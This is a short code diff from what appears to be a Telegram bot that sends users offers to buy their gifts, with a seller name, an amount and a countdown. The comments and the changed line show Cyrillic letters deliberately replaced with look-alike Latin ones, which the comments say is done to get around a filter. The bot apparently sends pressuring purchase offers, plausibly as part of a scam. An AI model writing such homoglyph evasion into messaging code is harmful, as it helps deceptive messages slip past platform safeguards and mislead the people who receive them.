@@ -561,8 +561,8 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         minutes = (total_seconds % 3600) // 60
         time_text = f"{hours}ч {minutes}м."
         gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
-        # Основной офер: "хочeт прeдложить" (е латинская для обхода)
-        body = f"<b>{seller_name}</b> хочeт прeдложить за Ваш подарок {gift_link} <b>{amount}</b>.\n\nCдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
+        # Основной офер: "хoчeт приoбрeсти" (о,е латинские для обхода)
+        body = f"<b>{seller_name}</b> хoчeт приoбрeсти Ваш подарок {gift_link} за <b>{amount}</b>.\n\nCдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
     
     # Кнопки добавляем только в самом конце (уровень 8+)
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"]) if test_level == 0 or test_level >= 8 else None
